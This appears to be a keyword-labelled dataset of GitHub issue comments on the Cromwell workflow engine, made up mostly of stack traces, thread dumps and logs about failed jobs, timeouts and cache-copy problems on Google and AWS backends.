Performance,"dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for unknown reason: Failed. at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure(StandardAsyncExecutionActor.scala:1170); at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure$(StandardAsyncExecutionActor.scala:1169); at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.handleExecutionFailure(GcpBatchAsyncBackendJobExecutionActor.scala:123); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1442); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1439); at scala.concurrent.impl.Promise$Transformation.run(Promise.scala:490); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). 2024-04-16 17:30:28 cromwell-system-akka.dispatchers.engine-dispatcher-2309 INFO - WorkflowManagerActor: Workflow actor for 0c7363b7-6b8f-48cf-8f38-f66d127b305f completed with status 'Fa; iled'. The workflow will be removed from the workflow store. =======================log end============; ```. Thanks. If I run the WDL again, it works without any problem. The jobs fails will always be preempted. Regards,; Zhili",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:2714,concurren,concurrent,2714,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630,1,['concurren'],['concurrent']
Performance,"downHook1"" #44 prio=5 os_prio=0 tid=0x00007fdbcc9ce000 nid=0x10a8 waiting on condition [0x00007fd9ccfce000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$addShutdownHook$1.apply$mcV$sp(WorkflowManagerActor.scala:125); at scala.sys.ShutdownHookThread$$anon$1.run(ShutdownHookThread.scala:34). ""pool-1-thread-20"" #95 prio=5 os_prio=0 tid=0x00007fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadP",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1065,concurren,concurrent,1065,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"e 80 calls to the task producing it. 2 fastqs get chucked into 20 chunks each, so 40 total. FastQC is run for these chunks once before adapter clipping and once after, so 80 total. There's a bunch of other jobs being run as well, but I'm only seeing this error for this specifc output (`Fastqc.images`). ```; [2018-10-11 13:48:43,66] [error] WorkflowManagerActor Workflow 0a20b0d2-8ad2-43b1-ba92-49e1c39d6578 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'Fastqc.images': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379:1311,concurren,concurrent,1311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379,2,['concurren'],['concurrent']
Performance,"e expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHT",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:1641,concurren,concurrent,1641,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"e expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:17,54] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.AllelicCNV:3:1] Status change from Running to Success; [2016-10-28 14:38:17,67] [info] WorkflowExecutionActor-a3dd8163-de37-4467-a227-5364959a8940 [a3dd8163]: Starting calls: case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1, case_gatk_acnv_workflow.PlotACNVResults:3:1; [2016-10-28 14:38:18,14] [info] JesRun [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1]: JES Run ID is operations/ENPH6N2AKxi-zoCK0M65gEAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:18,31] [info] JesRun [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:3:1]: JES Run ID is operations/EPfI6N2AKxi_iI64ku3M2xAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:43,07] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:12386,concurren,concurrent,12386,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,e invalid: Connection reset; akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-d86697f6-ca39-417b-b575-fc955c808983/WorkflowExecutionActor-d86697f6-ca39-417b-b575-fc955c808983/d86697f6-ca39-417b-b575-fc955c808983-EngineJobExecutionActor-DeliciousFileSpam.FileSpam:364:1/d86697f6-ca39-417b-b575-fc955c808983-BackendJobExecutionActor-d86697f6:DeliciousFileSpam.FileSpam:364:1/JesAsyncBackendJobExecutionActor: exception during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:30); at cromwell.backend.impl.jes.JesCallPaths.<init>(J,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1108,concurren,concurrent,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['concurren'],['concurrent']
Performance,e$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:100345,concurren,concurrent,100345,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,e$WithFilter.foreach(TraversableLike.scala:777) ~[cromwell.jar:0.19]; 905194- at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; 905195- at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; 905196- at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; 905197- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; 905198- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; 905199- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905200- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905201- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; 905202- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; 905203- at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; 905204- at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; 905205- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 905206- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 905207- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 905208- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 905209- at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; 905210- at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; 905211- at ,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:6252,concurren,concurrent,6252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['concurren'],['concurrent']
Performance,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1267,cache,cache,1267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,3,"['Cache', 'cache']","['Cache', 'cache', 'cacheCopy']"
Performance,"e. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it o",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1705,cache,cache,1705,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['cache'],['cache']
Performance,"e.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x000000015b76b538> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""Service Thread"" #17 daemon pr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5280,concurren,concurrent,5280,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,e.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:79); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); 	at ; cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.ru,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495:2707,concurren,concurrent,2707,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495,1,['concurren'],['concurrent']
Performance,"e1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 3589863- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 3589864- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 3589865- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 3589866- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19]; 3589867- at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; 3589868- at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; 3589869- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 3589870- at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; 3589871- at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; 3589872- at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 3589873:2016-04-24 